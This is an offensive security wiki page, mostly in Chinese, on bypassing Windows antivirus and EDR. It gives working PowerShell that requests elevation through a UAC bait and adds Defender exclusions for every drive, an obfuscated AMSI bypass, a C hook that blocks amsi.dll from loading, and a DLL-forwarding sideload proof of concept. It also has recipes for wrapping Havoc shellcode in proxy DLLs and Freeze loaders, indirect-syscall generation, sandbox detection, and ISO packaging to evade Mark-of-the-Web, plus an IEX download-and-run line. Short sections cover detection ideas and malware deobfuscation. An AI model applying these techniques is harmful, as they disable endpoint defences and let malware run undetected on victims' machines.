# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**此页面最初由** [**@m2rc_p**](https://twitter.com/m2rc_p)** 编写！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot)：用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：通过伪装成其他 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 前使用 Installer-style UAC bait

伪装成 game cheats 的公开 loaders 通常会以未签名的 Node.js/Nexe installers 形式发布，先**请求用户提升权限**，然后才削弱 Defender。流程很简单：

1. 使用 `net session` 检测是否处于 administrative context。只有调用者拥有 admin 权限时，该命令才会成功，因此失败表示 loader 正以 standard user 身份运行。
2. 立即使用 `RunAs` verb 重新启动自身，以触发预期的 UAC consent prompt，同时保留原始 command line。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者本来就相信自己正在安装“破解”软件，因此通常会接受该提示，从而授予 malware 修改 Defender 策略所需的权限。

### 为每个驱动器号设置 `MpPreference` 的全面排除项

获得提升的权限后，GachiLoader-style chains 会最大限度地扩大 Defender 的盲区，而不是直接禁用服务。loader 首先终止 GUI watchdog（`taskkill /F /IM SecHealthUI.exe`），然后推送**极其宽泛的排除项**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 该循环会遍历每个已挂载的文件系统（D:\、E:\、USB 设备等），因此**今后丢弃到磁盘任意位置的 payload 都会被忽略**。
- 排除 `.sys` 扩展名是面向未来的操作——攻击者保留了之后加载未签名驱动的选项，而无需再次修改 Defender。
- 所有更改都会写入 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`，后续阶段可以确认这些排除项是否持久存在，或在不重新触发 UAC 的情况下扩展它们。

由于没有停止任何 Defender 服务，简单的健康检查仍会报告“antivirus active”，尽管实时检测实际上不会检查这些路径。

## **AV Evasion Methodology**

目前，AV 使用不同方法检查文件是否恶意，包括静态检测、动态分析，以及更先进的 EDR 所使用的行为分析。

### **静态检测**

静态检测通过标记二进制文件或脚本中已知的恶意字符串或字节数组来实现，同时也会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被发现，因为它们很可能已经经过分析并被标记为恶意。绕过此类检测有几种方法：

- **Encryption**

如果对二进制文件进行加密，AV 将无法检测到你的程序，但你需要某种 loader 来解密程序，并在内存中运行它。

- **Obfuscation**

有时，你只需要修改二进制文件或脚本中的一些字符串，就能让它通过 AV 检测，但根据你要混淆的内容，这可能会是一项耗时的工作。

- **Custom tooling**

如果你开发自己的工具，就不会存在已知的恶意特征，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会将文件拆分成多个片段，然后要求 Defender 分别扫描每个片段，这样就能准确告诉你二进制文件中哪些字符串或字节被标记了。

我强烈建议你查看这个关于实用 AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指 AV 在 sandbox 中运行你的二进制文件，并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分处理起来可能更棘手，但你可以采取以下措施来规避 sandbox。

- **执行前 Sleep** 根据实现方式不同，这可能是绕过 AV 动态分析的好方法。AV 可用于扫描文件的时间非常短，以免中断用户工作流程，因此较长的 sleep 可能会干扰对二进制文件的分析。问题在于，许多 AV sandbox 会根据 sleep 的实现方式直接跳过它。
- **检查机器资源** 通常，Sandbox 可使用的资源非常少（例如 < 2GB RAM），否则可能会拖慢用户的机器。你还可以在这里发挥创意，例如检查 CPU 温度，甚至检查风扇转速，因为这些内容不一定会在 sandbox 中实现。
- **机器特定检查** 如果你想针对工作站加入了 `"contoso.local"` 域的用户，可以检查计算机的域名是否与你指定的域匹配；如果不匹配，就可以让程序退出。

事实证明，Microsoft Defender's Sandbox 的 computername 是 HAL9TH。因此，你可以在 malware 引爆前检查计算机名称；如果名称匹配 HAL9TH，就说明你位于 Defender's sandbox 中，此时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

来自 [@mgeeky](https://twitter.com/mariuszbit) 的其他一些针对 Sandbox 的实用建议：

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本文前面所说，**public tools** 最终都会**被检测到**，所以你应该问自己一个问题：

例如，如果你想 dump LSASS，**你真的需要使用 mimikatz 吗**？还是可以使用另一个知名度较低、同样能够 dump LSASS 的项目？

正确答案可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 标记最多的 malware 之一；虽然该项目本身非常酷，但要使用它绕过 AV 也是一场噩梦。因此，只需针对你的目标寻找替代方案即可。

> [!TIP]
> 修改 payload 以进行规避时，请确保在 Defender 中**关闭自动样本提交**；如果你的目标是长期实现规避，请认真注意：**不要上传到 VIRUSTOTAL**。如果你想检查 payload 是否会被某个特定 AV 检测到，请将其安装在 VM 上，尝试关闭自动样本提交，然后在其中进行测试，直到你对结果满意为止。

## EXEs vs DLLs

只要可能，始终**优先使用 DLL 进行规避**。根据我的经验，DLL 文件通常**更不容易被检测和分析**，因此在某些情况下，这是一个非常简单的规避检测技巧（当然，前提是你的 payload 能够以 DLL 的形式运行）。

如图所示，Havoc 的 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比普通 Havoc EXE payload 与普通 Havoc DLL</p></figcaption></figure>

现在我们将介绍一些可以利用 DLL 文件实现更高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用了 loader 使用的 DLL 搜索顺序，通过将受害应用程序和恶意 payload 放置在彼此相邻的位置来实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 powershell script 检查容易受到 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出位于 "C:\Program Files\\" 中、易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**自行探索可进行 DLL Hijack/Sideload 的程序**。如果操作得当，这项技术相当隐蔽；但如果使用公开已知的 DLL Sideload 程序，你可能很容易被发现。

仅仅放置一个程序预期加载名称的恶意 DLL，并不会加载你的 payload，因为程序需要该 DLL 中存在某些特定函数。为了解决这个问题，我们将使用另一项名为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序发出的调用从 proxy（恶意）DLL 转发到原始 DLL，从而保留程序的功能，并使我们能够处理 payload 的执行。

我将使用 [@flangvik](https://twitter.com/Flangvik) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我执行的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一条命令会生成 2 个文件：一个 DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 中的 Detection rate 都是 0/26！我认为这算是成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543)，了解 DLL Sideloading；同时也建议观看 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。

### 滥用 Forwarded Exports（ForwardSideLoading）

Windows PE modules 可以导出实际上是“forwarders”的 functions：它们不是指向 code，而是由一个形如 `TargetDll.TargetFunc` 的 ASCII string 组成。当 caller 解析该 export 时，Windows loader 会：

- 如果 `TargetDll` 尚未加载，则加载它
- 从其中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，则它会从受保护的 KnownDLLs namespace 中提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则会使用正常的 DLL search order，其中包括执行 forward resolution 的 module 所在的 directory。

这实现了一种间接的 sideloading primitive：找到一个将 function forward 到非 KnownDLL module name 的 signed DLL，然后将该 signed DLL 与一个由 attacker 控制、且名称与 forwarded target module 完全相同的 DLL 放在同一目录中。当调用 forwarded export 时，loader 会解析该 forward，并从同一 directory 加载你的 DLL，执行其 DllMain。

在 Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此会通过正常搜索顺序进行解析。

PoC（copy-paste）：
1) 将已签名的系统 DLL 复制到可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。只需一个最小的 DllMain 即可执行代码；无需实现被转发的函数即可触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（signed）加载 side-by-side 的 `keyiso.dll`（signed）
- 在解析 `KeyIsoSetAuditingInterface` 时，loader 跟随 forward 到 `NCRYPTPROV.SetAuditingInterface`
- 随后 loader 从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，则只有在 `DllMain` 已经运行后，才会出现 “missing API” 错误

Hunting tips:
- 重点关注 target module 不是 KnownDLL 的 forwarded exports。KnownDLLs 列于 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`。
- 你可以使用以下 tooling 枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder inventory，以搜索候选项：https://hexacorn.com/d/apis_fwd.txt

检测/防御思路：
- 监控 LOLBins（例如 `rundll32.exe`）从非系统路径加载已签名 DLL，随后从该目录加载具有相同基本名称的非 KnownDLLs
- 针对如下进程/模块链发出告警：`rundll32.exe` → 非系统路径下的 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并禁止在应用程序目录中同时进行写入和执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，可利用 suspended processes、direct syscalls 和 alternative execution methods 绕过 EDR`

你可以使用 Freeze 以隐蔽方式加载并执行 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 只是一个猫鼠游戏，今天有效的方法明天可能就会被检测到，因此绝不要只依赖一种工具；如果可能，尝试串联多种 evasion techniques。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs 通常会在 `ntdll.dll` 的 syscall stubs 上放置 **user-mode inline hooks**。要绕过这些 hooks，可以生成 **direct** 或 **indirect syscall stubs**，加载正确的 **SSN**（System Service Number），并在不执行被 hook 的 export entrypoint 的情况下转换到 kernel mode。

**Invocation options:**
- **Direct (embedded)**：在生成的 stub 中发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**：跳转到 `ntdll` 中现有的 `syscall` gadget，使 kernel transition 看起来源自 `ntdll`（有助于进行 heuristic evasion）；**randomized indirect** 会在每次调用时从 gadget pool 中选择一个 gadget。
- **Egg-hunt**：避免在磁盘上嵌入静态的 `0F 05` opcode sequence；在运行时解析 syscall sequence。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**：通过按 virtual address 对 syscall stubs 排序，而不是读取 stub bytes，来推断 SSNs。
- **SyscallsFromDisk**：映射一个干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSNs，然后取消映射（绕过所有内存中的 hooks）。
- **RecycledGate**：将 VA-sorted SSN inference 与 stub 干净时的 opcode validation 结合；如果 stub 被 hook，则回退到 VA inference。
- **HW Breakpoint**：在 `syscall` instruction 上设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而无需解析被 hook 的 bytes。

SysWhispers4 使用示例：
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI 的创建旨在防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。最初，AV 只能扫描**磁盘上的文件**，因此，如果你能够以某种方式**直接在内存中**执行 payload，AV 就无法采取任何措施加以阻止，因为它没有足够的可见性。

AMSI 功能已集成到 Windows 的以下组件中。

- User Account Control，或 UAC（EXE、COM、MSI 或 ActiveX 安装的提权）
- PowerShell（脚本、交互式使用和动态代码评估）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA 宏

它允许 antivirus solutions 通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

在 Windows Defender 上运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将产生以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何添加 `amsi:` 前缀，随后是运行该脚本的 executable 路径，在本例中为 powershell.exe。

我们没有将任何文件写入磁盘，但仍然因为 AMSI 在内存中被捕获。

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI。这甚至会影响用于加载内存中执行内容的 `Assembly.Load(byte[])`。因此，如果你希望在内存中执行并规避 AMSI，建议使用较低版本的 .NET（如 4.7.2 或更低版本）。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要通过静态检测工作，因此，修改你尝试加载的脚本可能是规避检测的有效方法。

但是，AMSI 能够对脚本进行反混淆，即使脚本包含多层混淆，因此，根据实现方式，obfuscation 可能是一个糟糕的选择。这使得规避检测并不那么直接。不过，有时你只需要更改几个变量名就可以成功，因此这取决于某个内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）进程中实现的，即使以 unprivileged user 身份运行，也可以轻易篡改它。由于 AMSI 实现中的这一缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不再启动扫描。该方法最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，Microsoft 随后开发了相应的 signature，以防止其被更广泛地使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 PowerShell 代码，就能使 AMSI 对当前 PowerShell 进程不可用。当然，这一行代码本身已被 AMSI 标记，因此需要进行一些修改才能使用该 technique。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以了解更详细的说明。

There are also many other techniques used to bypass AMSI with PowerShell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI 仅在 `amsi.dll` 加载到当前进程后才会初始化。一种稳健且与语言无关的 bypass 方法，是在用户态对 `ntdll!LdrLoadDll` 设置 hook，当请求的模块为 `amsi.dll` 时返回错误。这样一来，AMSI 永远不会加载，该进程也不会执行任何扫描。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- 可用于 PowerShell、WScript/CScript 和 custom loaders（即任何原本会加载 AMSI 的组件）。
- 可结合通过 stdin 传入脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`），以避免产生过长的命令行痕迹。
- 已发现 loaders 通过 LOLBins 执行时使用此方法（例如，`regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于 bypass AMSI 的脚本。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于 bypass AMSI 的脚本。该工具通过随机化的用户定义函数、变量、字符表达式，并对 PowerShell 关键字应用随机大小写来避免 signature。

**移除 detected signature**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 等工具，从当前进程的内存中移除 detected AMSI signature。该工具通过扫描当前进程内存中的 AMSI signature，然后使用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR products**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 中找到使用 AMSI 的 AV/EDR products 列表。

**使用 Powershell version 2**
如果使用 PowerShell version 2，则不会加载 AMSI，因此可以运行脚本而不会被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项用于记录系统上执行的所有 PowerShell 命令的功能。这对于审计和故障排查很有用，但对于希望**规避检测的攻击者来说可能是个问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **禁用 PowerShell Transcription 和 Module Logging**：可以使用 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 等工具来实现。
- **使用 Powershell version 2**：如果使用 PowerShell version 2，则不会加载 AMSI，因此可以运行脚本而不被 AMSI 扫描。可以这样操作：`powershell.exe -version 2`
- **使用 Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来启动一个没有防御机制的 powershell（这正是 Cobal Strike 使用的 `powerpick` 的实现方式）。


## Obfuscation

> [!TIP]
> 多种 obfuscation 技术依赖于加密数据，这会增加 binary 的熵，从而使 AV 和 EDR 更容易检测到它。对此要保持谨慎，或许只应将加密应用于代码中敏感或需要隐藏的特定部分。

### Deobfuscating ConfuserEx-Protected .NET Binaries

分析使用 ConfuserEx 2（或商业 fork）的 malware 时，通常会遇到多层保护机制，这些机制会阻止 decompiler 和 sandbox 正常工作。下面的工作流程可以可靠地**恢复接近原始状态的 IL**，之后即可在 dnSpy 或 ILSpy 等工具中将其 decompile 为 C#。

1.  移除 Anti-tampering – ConfuserEx 会加密每个 *method body*，并在 *module* static constructor（`<Module>.cctor`）中解密。它还会修改 PE checksum，因此任何改动都会导致 binary 崩溃。使用 **AntiTamperKiller** 定位加密的 metadata tables，恢复 XOR keys，并重写一个干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output 包含 6 个 anti-tamper 参数（`key0-key3`、`nameHash`、`internKey`），在构建自定义 unpacker 时可能很有用。

2.  恢复 Symbol / control-flow – 将 *clean* file 提供给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot fork）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags：
• `-p crx` – 选择 ConfuserEx 2 profile  
• de4dot 将撤销 control-flow flattening，恢复原始 namespaces、classes 和 variable names，并解密 constant strings。

3.  移除 Proxy-call – ConfuserEx 会使用轻量级 wrappers（也称为 *proxy calls*）替换直接的 method calls，以进一步破坏 decompilation。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，应能看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的 wrapper functions（`Class8.smethod_10` 等）。

4.  手动清理 – 在 dnSpy 中运行生成的 binary，搜索大型 Base64 blobs 或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用位置，以定位*真正的* payload。malware 通常会将其存储为 TLV-encoded byte array，并在 `<Module>.byte_0` 中进行初始化。

上述流程无需运行 malicious sample 即可恢复 execution flow，对于在 offline workstation 上工作非常有用。

> 🛈  ConfuserEx 会生成名为 `ConfusedByAttribute` 的 custom attribute，可将其用作 IOC，以自动对 samples 进行初步分类。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改功能提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成混淆代码，无需使用任何外部工具，也无需修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ 模板元编程框架生成的混淆操作，使试图破解应用程序的人更加难以完成工作。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够混淆多种不同的 pe 文件，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个面向 LLVM 支持语言的细粒度代码混淆框架，使用 ROP（return-oriented programming）。ROPfuscator 在汇编代码级别对程序进行混淆，将常规指令转换为 ROP chains，从而阻碍我们对正常控制流的自然认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个使用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们

## SmartScreen & MoTW

下载并执行某些来自互联网的可执行文件时，你可能见过此屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护终端用户，防止其运行可能具有恶意的应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的方式工作，这意味着不常被下载的应用程序会触发 SmartScreen，从而向终端用户发出警告并阻止其执行文件（不过仍然可以通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW**（Mark of The Web）是一种名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时会自动创建，并记录该文件的下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用**可信**签名证书签名的可执行文件**不会触发 SmartScreen**。

防止 payload 被标记为 Mark of The Web 的一种非常有效的方法，是将其打包到某种容器中，例如 ISO。这是因为 Mark-of-the-Web (MOTW)**无法**应用于**非 NTFS**卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payload 打包到输出容器中的工具，用于规避 Mark-of-the-Web。

使用示例：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
这是一个使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包到 ISO 文件中以绕过 SmartScreen 的示例。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一种强大的日志记录机制，允许应用程序和系统组件**记录事件**。不过，安全产品也可以利用它来监控和检测恶意活动。

与禁用（绕过）AMSI 类似，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回，而不记录任何事件。实现方式是对内存中的函数进行 patch，使其立即返回，从而有效禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 中找到更多信息。


## C# Assembly Reflection

在内存中加载 C# binaries 已经是广为人知的技术，并且仍然是运行 post-exploitation tools 而不被 AV 捕获的非常有效的方法。

